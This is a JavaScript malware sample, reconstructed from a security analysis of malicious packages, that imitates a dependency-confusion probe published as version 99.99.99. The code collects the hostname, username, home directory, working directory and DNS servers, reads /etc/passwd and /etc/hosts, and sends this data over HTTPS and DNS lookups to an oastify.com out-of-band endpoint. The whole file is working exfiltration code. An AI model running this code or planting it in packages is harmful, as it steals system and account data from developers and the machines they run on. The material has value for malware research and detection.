// oast-recon — reconstructed from public security analyses
// Source: https://socket.dev/blog/weaponizing-oast-how-malicious-packages-exploit-npm-pypi-and-rubygems
//
// Uses OAST (Out-of-band Application Security Testing) endpoints
// like Burp Collaborator to exfiltrate system data. Disguised as
// dependency confusion probe (version 99.99.99).
//
// Technique: OAST DNS/HTTP exfiltration + dependency confusion

const https = require("https");
const os = require("os");
const dns = require("dns");
const fs = require("fs");

// Collect system information
var data = {
  hostname: os.hostname(),
  username: os.userInfo().username,
  homedir: os.homedir(),
  platform: os.platform(),
  arch: os.arch(),
  cwd: process.cwd(),
  dnsServers: dns.getServers()
};

// Attempt to read /etc/passwd and /etc/hosts for network context
try {
  data.passwd = fs.readFileSync("/etc/passwd", "utf8").substring(0, 500);
} catch(e) {}
try {
  data.hosts = fs.readFileSync("/etc/hosts", "utf8").substring(0, 500);
} catch(e) {}

// Exfiltrate via HTTPS to OAST endpoint (Burp Collaborator style)
function sendData(pathPrefix, payload) {
  var options = {
    hostname: "rzucd2dfiuz08dnqwkigu37xfolf95xu.oastify.com",
    port: 443,
    path: "/" + pathPrefix,
    method: "GET",
    headers: {
      "Content-Type": "application/json"
    }
  };
  var req = https.request(options, function(res) {});
  req.write(JSON.stringify(payload));
  req.end();
  req.on("error", function() {});
}

sendData("install", data);

// Also exfiltrate via DNS for environments that block HTTPS
var encoded = Buffer.from(os.hostname() + "|" + os.userInfo().username).toString("hex").substring(0, 60);
dns.lookup(encoded + ".rzucd2dfiuz08dnqwkigu37xfolf95xu.oastify.com", function() {});
